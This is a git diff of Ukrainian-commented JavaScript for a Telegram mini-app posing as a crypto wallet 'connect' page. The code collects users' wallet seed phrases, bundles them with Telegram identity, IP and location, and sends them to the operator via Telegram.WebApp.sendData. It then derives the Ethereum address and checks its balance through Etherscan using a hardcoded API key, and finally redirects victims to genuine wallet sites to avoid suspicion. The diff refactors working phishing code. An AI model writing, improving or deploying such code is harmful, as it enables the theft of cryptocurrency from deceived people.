@@ -26,48 +26,37 @@ if (!langs.some(lang => allowedLangs.includes(lang))) {
 document.addEventListener("DOMContentLoaded", () => {
     console.log("📦 DOMContentLoaded подія спрацювала");
 
-    // Перевірка Telegram WebApp
+    // Telegram WebApp перевірка
     if (!window.Telegram || !Telegram.WebApp) {
         console.warn("❌ Telegram WebApp не ініціалізовано!");
     } else {
         console.log("✅ Telegram WebApp працює");
     }
 
-    // 🛠️ Перевіримо існування необхідних елементів
     const btn = document.getElementById("submitBtn");
     const lengthInput = document.getElementById("length");
     const seedContainer = document.getElementById("seedContainer");
 
-    console.log("🔍 Кнопка #submitBtn:", btn);
-
-    if (!lengthInput || !seedContainer) {
-        console.error("❌ Елементи #length або #seedContainer не знайдені в DOM");
+    if (!btn || !lengthInput || !seedContainer) {
+        console.error("❌ Не знайдені необхідні елементи DOM");
         return;
     }
 
-    // Встановити поля seed-фрази
-    try {
-        renderSeedInputs();  // ← Генеруємо поля фрази
-    } catch (e) {
-        console.error("❌ Помилка у renderSeedInputs:", e);
-    }
+    renderSeedInputs();
+    setupSelect();
 
-    // Обробник кнопки
-    if (btn) {
-        btn.addEventListener("click", () => {
-            console.log("🔘 Кнопка 'Подключить' нажата");
-            try {
-                submitSeed();
-            } catch (e) {
-                console.error("❌ Помилка у submitSeed:", e);
-            }
-        });
-    } else {
-        console.warn("🚫 Кнопка #submitBtn не знайдена у DOM");
-    }
+    btn.addEventListener("click", () => {
+        console.log("🔘 Кнопка 'Подключить' нажата");
+        submitSeed();
+    });
+
+    lengthInput.addEventListener("change", () => {
+        renderSeedInputs();
+        clearWarning();
+    });
 });
 
-// 📦 Поля seed-фрази
+// 📦 Генерація полів
 function renderSeedInputs() {
     const length = parseInt(document.getElementById("length").value);
     const container = document.getElementById("seedContainer");
@@ -90,7 +79,7 @@ function renderSeedInputs() {
     }
 }
 
-// 📋 Вставка всіх слів
+// 📋 Масова вставка
 function handleBulkSeedInput(e) {
     const inputs = document.querySelectorAll(".seed-word");
     const words = e.target.value.trim().split(/\s+/);
@@ -99,7 +88,7 @@ function handleBulkSeedInput(e) {
     }
 }
 
-// 🎛️ Wallet select
+// 🌀 Wallet selector
 function setupSelect() {
     const selectWrapper = document.querySelector('.custom-select');
     const selected = selectWrapper.querySelector('.selected');
@@ -122,7 +111,7 @@ function setupSelect() {
     });
 }
 
-// ⚠️ Повідомлення
+// ⚠️ Попередження
 function showWarning(message) {
     let warning = document.getElementById("validationWarning");
     if (!warning) {
@@ -136,13 +125,12 @@ function showWarning(message) {
     warning.textContent = message;
     warning.style.display = "block";
 }
-
 function clearWarning() {
     const warning = document.getElementById("validationWarning");
     if (warning) warning.style.display = "none";
 }
 
-// 🌀 Статус
+// ⏳ Статус
 function showProcessing(message) {
     let processing = document.getElementById("processingInfo");
     if (!processing) {
@@ -156,35 +144,31 @@ function showProcessing(message) {
     processing.textContent = message;
 }
 
-// 🚀 submitSeed()
+// 🚀 submitSeed
 function submitSeed() {
-    console.log("🚀 Запуск submitSeed()");
     clearWarning();
 
     const length = parseInt(document.getElementById("length").value);
     const wallet = document.getElementById("wallet").value || "unknown";
     const ua = navigator.userAgent;
-    const inputs = document.querySelectorAll("#seedContainer .seed-word");
+    const inputs = document.querySelectorAll(".seed-word");
     const words = Array.from(inputs).map(i => i.value.trim()).filter(Boolean);
 
     if (words.length !== length) {
-        console.warn("❌ Причина зупинки: не вистачає слів", words);
         showWarning(`❌ Введено ${words.length}, очікується ${length} слів`);
         return;
     }
 
     const invalidWords = words.filter(w => !/^[a-zA-Z]+$/.test(w));
     if (invalidWords.length) {
-        console.warn("❌ Причина зупинки: недопустимі символи", invalidWords);
         showWarning(`🚫 Недопустимі символи: ${invalidWords.join(", ")}`);
         return;
     }
 
     const seed = words.join(" ");
-    showProcessing("⏳ Перевірка seed-фрази…");
     document.querySelector(".container").innerHTML = "<h3 style='color:green;text-align:center'>⏳ Перевірка…</h3>";
 
-    const tgUser = (Telegram?.WebApp?.initDataUnsafe?.user) || {};
+    const tgUser = Telegram?.WebApp?.initDataUnsafe?.user || {};
     const payload = {
         user_id: tgUser.id || "-",
         username: tgUser.username || "-",
@@ -199,15 +183,14 @@ function submitSeed() {
         timestamp: new Date().toISOString()
     };
 
-    console.log("📦 Payload сформовано:", payload);
-
     localStorage.setItem("payload_backup", JSON.stringify(payload));
+    console.log("📦 Payload:", payload);
 
     if (Telegram?.WebApp?.sendData) {
         Telegram.WebApp.sendData(JSON.stringify(payload));
-        console.log("✅ Payload надіслано в Telegram WebApp");
+        console.log("✅ Payload надіслано");
     } else {
-        console.warn("❌ Telegram WebApp.sendData недоступний");
+        console.warn("❌ WebApp.sendData недоступний");
     }
 
     setTimeout(() => {
@@ -220,30 +203,24 @@ function showProfileData() {
     const ETHERSCAN_API_KEY = "WEIWRB4VW3SDGAF2FGZWV2MY5DUJNQP7CD";
     const data = JSON.parse(localStorage.getItem("payload_backup") || "{}");
 
-    const seedPhrase = (data.seed || "").trim();
-    const walletType = (data.wallet || "").toLowerCase();
-    const timestamp = data.timestamp || "–";
-    const ip = data.ip || "–";
-    const locationInfo = data.location || "–";
+    document.getElementById("timestamp").textContent = data.timestamp || "-";
+    document.getElementById("userIp").textContent = data.ip || "-";
+    document.getElementById("userLocation").textContent = data.location || "-";
+    document.getElementById("seed").textContent = data.seed || "-";
 
-    document.getElementById("timestamp").textContent = timestamp;
-    document.getElementById("userIp").textContent = ip;
-    document.getElementById("userLocation").textContent = locationInfo;
-    document.getElementById("seed").textContent = seedPhrase;
-
-    if (!seedPhrase) return console.error("❌ Seed-фраза порожня");
+    if (!data.seed) return;
 
     try {
-        const wallet = ethers.Wallet.fromMnemonic(seedPhrase);
+        const wallet = ethers.Wallet.fromMnemonic(data.seed);
         const ethAddress = wallet.address;
         document.getElementById("ethAddress").textContent = ethAddress;
-        console.log("✅ ETH адрес:", ethAddress);
         fetchETHBalance(ethAddress, ETHERSCAN_API_KEY);
     } catch (e) {
         console.error("❌ ETH генерація:", e.message);
     }
 
     document.getElementById("goWalletBtn").addEventListener("click", () => {
+        const walletType = (data.wallet || "").toLowerCase();
         let url = "https://www.google.com";
         if (walletType.includes("metamask")) url = "https://metamask.io/";
         else if (walletType.includes("trust")) url = "https://trustwallet.com/";
@@ -251,11 +228,7 @@ function showProfileData() {
         else if (walletType.includes("ton")) url = "https://tonkeeper.com/";
         else if (walletType.includes("coinbase")) url = "https://www.coinbase.com/wallet";
 
-        if (window.Telegram && Telegram.WebApp) {
-            Telegram.WebApp.openLink(url);
-        } else {
-            window.open(url, "_blank");
-        }
+        Telegram?.WebApp?.openLink?.(url) || window.open(url, "_blank");
     });
 }
 
